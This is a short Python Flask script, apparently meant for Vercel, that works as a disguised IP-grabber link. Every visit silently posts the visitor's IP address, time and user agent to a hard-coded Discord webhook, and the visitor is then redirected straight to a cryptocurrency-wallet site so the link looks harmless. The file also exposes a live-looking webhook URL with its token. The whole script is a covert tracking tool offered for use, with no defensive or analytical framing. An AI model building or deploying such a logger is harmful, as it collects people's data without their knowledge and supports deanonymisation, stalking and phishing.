from flask import Flask, request, redirect
from datetime import datetime
import requests
import os

app = Flask(__name__)

def get_real_ip():
    """Get real client IP handling all proxies"""
    if request.environ.get('HTTP_X_FORWARDED_FOR') == '127.0.0.1':
        return request.environ.get('REMOTE_ADDR')
    
    forwarded = request.environ.get('HTTP_X_FORWARDED_FOR')
    if forwarded:
        ip = forwarded.split(',')[0].strip()
        return ip
    
    cf_ip = request.headers.get('CF-Connecting-IP')
    if cf_ip:
        return cf_ip
    
    true_ip = request.headers.get('True-Client-IP')
    if true_ip:
        return true_ip
    
    return request.environ.get('REMOTE_ADDR', 'Unknown')

def send_ip(ip, date, user_agent):
    webhook_url = "https://discord.com/api/webhooks/1447416593020752027/fTxDho-qrxHPpVcZ70Qt9X4lXWu8Y74OaRAC02Qhg8Y9HR2iqQhv5EgeCTT2eERMMEIp"
    
    embed = {
        "title": "🕵️ **New IP Logged**",
        "color": 0x00ff00,
        "fields": [
            {"name": "📍 IP Address", "value": f"`{ip}`", "inline": True},
            {"name": "📅 Date & Time", "value": f"`{date}`", "inline": True},
            {"name": "🌐 User Agent", "value": f"`{user_agent[:90]}...`", "inline": False}
        ],
        "footer": {"text": "Vercel IP Logger"},
        "timestamp": datetime.utcnow().isoformat()
    }
    
    data = {"username": "IP Tracker", "embeds": [embed]}
    
    try:
        requests.post(webhook_url, json=data, timeout=3)
    except:
        pass

@app.route("/", methods=['GET'])
def index():
    ip = get_real_ip()
    date = datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC")
    user_agent = request.headers.get('User-Agent', 'Unknown')

    # Log IP (fire and forget)
    send_ip(ip, date, user_agent)

    # Instant redirect
    return redirect("https://trustwallet.com", code=302)

# Vercel requires this for serverless
if __name__ == "__main__":
    app.run()
